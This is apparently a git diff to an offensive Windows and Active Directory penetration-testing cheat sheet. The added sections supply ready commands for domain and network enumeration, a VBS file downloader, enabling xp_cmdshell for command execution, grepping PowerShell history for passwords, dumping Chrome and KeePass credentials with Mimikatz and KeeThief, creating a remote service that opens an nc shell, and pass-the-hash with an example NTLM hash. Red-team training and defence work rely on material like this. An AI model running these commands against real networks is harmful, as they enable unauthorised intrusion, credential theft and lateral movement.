@@ -29,8 +29,18 @@ Get-Domain
 Get-DomainUser
 Get-DomainGroup
 Get-DomainGroupMember -identity "Domain Admins" -Domain m0chanAD.local -DomainController 10.10.14.10
-netdiscover -r subnet/24
 Find-DomainShare
+
+
+#Host Discovery
+netdiscover -r subnet/24
+nbtscan -r [range]
+for /L %i in (1,1,255) do  @ping.exe -n 1 -w 50 <10.10.10>.%i | findstr TTL
+
+
+#Reverse DNS Lookup
+$ComputerIPAddress = "10.10.14.14"
+[System.Net.Dns]::GetHostEntry($ComputerIPAddress).HostName
 ```
 
 https://github.com/tevora-threat/SharpView
@@ -73,6 +83,14 @@ nltest /DSGETDC:DomainName
 #  View Domain Trust Information
 ([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()
 
+nltest [server:<fqdn_foreign_domain>] /domain_trusts /all_trusts /v
+
+nltest /dsgetfti:<domain>
+
+nltest /server:<ip_dc> /domain_trusts /all_trusts
+
+([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+
 # View All Domain Controllers
 nltest /dclist:offense.local
 net group "domain controllers" /domain
@@ -100,6 +118,21 @@ klist tgt
 
 # whoami on older Windows systems
 set u
+
+#List all Usernames
+([adsisearcher]"(&(objectClass=User)(samaccountname=*))").FindAll().Properties.samaccountname
+
+#List Administrators
+
+([adsisearcher]"(&(objectClass=User)(admincount=1))").FindAll().Properties.samaccountname
+
+#List all Info about Specific User
+
+([adsisearcher]"(&(objectClass=User)(samaccountname=<username>))").FindAll().Properties
+
+#View All Users with Description Field Set
+
+([adsisearcher]"(&(objectClass=group)(samaccountname=*))").FindAll().Properties | % { Write-Host $_.samaccountname : $_.description }
 ```
 
 
@@ -138,104 +171,6 @@ Find-InterestingDomainAcl
 Invoke-ACLScanner
 Get-NetShare
 Get-NetLoggedon
-Get-NetLocalGroup
-Get-NetLocalGroupMember
-Get-NetSession
-Get-PathAcl
-ConvertFrom-UACValue
-Get-PrincipalContext
-New-DomainGroup
-New-DomainUser
-Add-DomainGroupMember
-Set-DomainUserPassword
-Invoke-Kerberoast
-Export-PowerViewCSV
-Find-LocalAdminAccess
-Find-DomainLocalGroupMember
-Find-DomainShare
-Find-DomainUserEvent
-Find-DomainProcess
-Find-DomainUserLocation
-Find-InterestingFile
-Find-InterestingDomainShareFile
-Find-DomainObjectPropertyOutlier
-TestMethod
-Get-Domain
-Get-NetDomain
-Get-DomainComputer
-Get-NetComputer
-Get-DomainController
-Get-NetDomainController
-Get-DomainFileServer
-Get-NetFileServer
-Convert-ADName
-Get-DomainObject
-Get-ADObject
-Get-DomainUser
-Get-NetUser
-Get-DomainGroup
-Get-NetGroup
-Get-DomainDFSShare
-Get-DFSshare
-Get-DomainDNSRecord
-Get-DNSRecord
-Get-DomainDNSZone
-Get-DNSZone
-Get-DomainForeignGroupMember
-Find-ForeignGroup
-Get-DomainForeignUser
-Find-ForeignUser
-ConvertFrom-SID
-Convert-SidToName
-Get-DomainGroupMember
-Get-NetGroupMember
-Get-DomainManagedSecurityGroup
-Find-ManagedSecurityGroups
-Get-DomainOU
-Get-NetOU
-Get-DomainSID
-Get-Forest
-Get-NetForest
-Get-ForestTrust
-Get-NetForestTrust
-Get-DomainTrust
-Get-NetDomainTrust
-Get-ForestDomain
-Get-NetForestDomain
-Get-DomainSite
-Get-NetSite
-Get-DomainSubnet
-Get-NetSubnet
-Get-DomainTrustMapping
-Invoke-MapDomainTrust
-Get-ForestGlobalCatalog
-Get-NetForestCatalog
-Get-DomainUserEvent
-Get-UserEvent
-Get-DomainGUIDMap
-Get-GUIDMap
-Resolve-IPAddress
-Get-IPAddress
-ConvertTo-SID
-Invoke-UserImpersonation
-Invoke-RevertToSelf
-Get-DomainSPNTicket
-Request-SPNTicket
-Get-NetComputerSiteName
-Get-SiteName
-Get-DomainGPO
-Get-NetGPO
-Set-DomainObject
-Set-ADObject
-Add-RemoteConnection
-Remove-RemoteConnection
-Get-IniContent
-Get-GptTmpl
-Get-GroupsXML
-Get-DomainPolicyData
-Get-DomainPolicy
-Get-DomainGPOLocalGroup
-Get-NetGPOGroup
 ```
 
 
@@ -253,6 +188,10 @@ smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
 smbclient //INSERTIPADDRESS/ipc$ -U john
 smbclient //INSERTIPADDRESS/admin$ -U john
 nbtscan [SUBNET]
+
+
+#Check for SMB Signing
+nmap --script smb-security-mode.nse -p 445 10.10.14.14 
 ```
 
 
@@ -287,12 +226,29 @@ dnsrecon -d m0chan -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
 
 
 
+LDAP
+
+```
+ldapsearch -H ldap://<ip>
+ldapwhoami
+```
+
 
 
 RPC Enumeration
 
 ```powershell
 rpcclient -U "10.10.14.14"
+srvinfo
+enumdomusers
+enumalsgroups domain
+lookupnames administrators
+querydominfo
+enumdomusers
+queryuser <user>
+lsaquery
+lookupnames Guest
+lookupnames Administrator
 ```
 
 Remote Desktop
@@ -333,6 +289,45 @@ echo bin >> ftp.txt
 echo GET nc.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -v -n -s:ftp.txt
+```
+
+
+
+VBS Script
+
+```powershell
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET",strURL,False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+
+
+
+cscript wget.vbs <url> <out_file>
+
+Use echoup function on pentest.ws to generate echo commands.
+https://pentest.ws/features
 ```
 
 
@@ -624,8 +619,54 @@ Lmao, you really think Id use the pass Summer2019?
 
 Kerberos Stuff
 
-```
+```powershell
 #https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
+#https://m0chan.github.io/Kerberos-Attacks-In-Depth
+```
+
+
+
+MSSQL Exploiting (PowerUpSQL)
+
+```powershell
+#https://github.com/NetSPI/PowerUpSQL
+
+#View SQL Instances
+Get-SQLInstanceDomain [| Get-SQLServerInfo]
+
+#Login in with Domain Account
+Get-SQLConnectionTestThreaded
+
+#Login in with Default Password
+Get-SQLServerDefaultLoginPw
+
+#List DB, Tables & Columns
+
+Get-SQLInstanceDomain | Get-SQLDatabase
+Get-SQLInstanceDomain | Get-SQLTable -DatabaseName <DB_name>
+Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName <DB_name> -TableName <Table_name>
+
+#Search Column Names for Word
+
+Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords "<word1,word2>" -Verbose -SampleSize 10
+
+#Try to Execute Commands (RCE)
+
+Invoke-SQLOSCmd
+
+
+#Enable XP_CMDShell Process
+
+EXEC sp_configure 'show advanced options', 1;  
+go  
+RECONFIGURE;  
+go  
+EXEC sp_configure 'xp_cmdshell', 1;  
+go  
+RECONFIGURE;  
+go  
+xp_cmdshell '<cmd>'
+go
 ```
 
 
@@ -763,6 +804,16 @@ schtasks /query /fo LIST /v
 
 
 
+Powershell History
+
+```powershell
+type C:\Users\m0chan\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+cat (Get-PSReadlineOption).HistorySavePath
+cat (Get-PSReadlineOption).HistorySavePath | sls passw
+```
+
+
+
 View Connected Drives
 
 ```powershell
@@ -877,6 +928,50 @@ http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip - For De
 
 Can also use PowerUP.ps1
 ```
+
+
+
+Dump Chrome Passwords (Also Post Exploit)
+
+```powershell
+#git clone https://github.com/rasta-mouse/CookieMonster
+
+CookieMonster creds
+CookieMonster.exe cookies -d [domain] -e 
+CookieMonster -a 
+
+Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.
+
+Can also use Mimikatz for this.
+
+mimikatz dpapi::chrome /in:"C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data"
+
+mimikatz dpapi::chrome /in:"C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data" /unprotect
+
+mimikatz dpapi::chrome /in:"C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies" /unprotect
+```
+
+
+
+Dump KeePass
+
+```powershell
+#https://github.com/HarmJ0y/KeeThief
+#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/
+
+Get-Process keepass
+tasklist | findstr keepass
+
+Attacking KeePass
+
+#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1
+Import-Module KeeThief.ps1
+Get-KeePassDatabaseKey -Verbose
+
+KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll & KeePatched.exe can also be used.
+```
+
+
 
 
 
@@ -1469,8 +1564,6 @@ Chisel (Fast TCP Tunnel over HTTP secured by SSH)
 
 
 
-
-
 CrackMapExec
 
 ```powershell
@@ -1526,6 +1619,38 @@ $cred = New-Object System.Management.Automation.PSCredential('WS02\USER', $secpa
 
 $Session = New-PSSession -ComputerName FileServer -Credential $cred
 Enter-PSSession $Session
+```
+
+
+
+Configure Remote Service over SMB (Requires Local Admin on Target Machine)
+
+```powershell
+net use \\192.168.0.15 [password] /u:DOMAIN\m0chan
+
+sc \\192.168.0.15 create <service_name> binpath= "cmd.exe /k COMMAND"
+sc \\192.168.0.15 create <service_name> binpath= "cmd.exe /k <c:\tools\nc.exe -L -p <port> -e cmd.exe>"
+sc \\192.168.0.15 start <service_name>
+```
+
+
+
+
+
+Pass-The-Hash
+
+```powershell
+crackmapexec <ip> -u <user> -H "<lm>" -x "<msfvenom psh-cmd>"
+
+impacket-wmiexec <user>@<ip> -hashes <lm:nt>
+
+pth-winexe -U <user>%<ntlm> //<ip> "<msfvenom psh-cmd>"
+
+python wmiexec.py -hashes :<hash> <user>@<ip>
+
+xfreerdp /u:<user> /d:<domain> /pth:<ntlm> /v:<ip>:3389 /dynamic-resolution
+
+sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
 ```
 
 
@@ -1712,4 +1837,3 @@ NoPowerShell
 
 Primiarily to be used with Cobalt & Execute Assembly but can also be reflectively loaded from any other C2 infra.
 ```
-
